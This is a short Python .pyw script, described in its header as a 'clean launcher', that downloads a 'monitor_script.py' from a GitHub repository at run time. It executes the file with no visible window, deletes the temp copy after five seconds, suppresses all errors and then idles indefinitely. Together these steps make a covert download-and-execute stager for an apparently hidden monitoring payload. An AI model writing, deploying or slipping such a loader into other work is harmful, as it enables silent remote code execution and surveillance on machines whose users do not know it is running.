# github_launcher.pyw - Clean launcher that downloads and runs monitor script
import os
import sys
import subprocess
import urllib.request
import tempfile
import time

def download_and_run():
    """Download monitor_script.py from GitHub and run it"""
    try:
        # GitHub URL
        GITHUB_USERNAME = "ElianBoden"
        GITHUB_REPO = "Deployer"
        GITHUB_BRANCH = "main"
        
        SCRIPT_URL = f"https://raw.githubusercontent.com/{GITHUB_USERNAME}/{GITHUB_REPO}/{GITHUB_BRANCH}/monitor_script.py"
        
        # Download the script
        response = urllib.request.urlopen(SCRIPT_URL)
        script_code = response.read().decode('utf-8')
        
        # Save to temp file
        temp_script = tempfile.gettempdir() + "/monitor_temp.py"
        with open(temp_script, 'w', encoding='utf-8') as f:
            f.write(script_code)
        
        # Run the script (hidden)
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        
        subprocess.Popen(
            [sys.executable, temp_script],
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # Delete temp file after 5 seconds
        time.sleep(5)
        try:
            os.remove(temp_script)
        except:
            pass
        
        return True
        
    except Exception as e:
        # Silent failure
        return False

def main():
    """Main launcher function"""
    # Wait for network
    time.sleep(5)
    
    # Download and run monitor script
    download_and_run()
    
    # Keep launcher running but idle
    while True:
        time.sleep(3600)  # Sleep for 1 hour

if __name__ == "__main__":
    main()
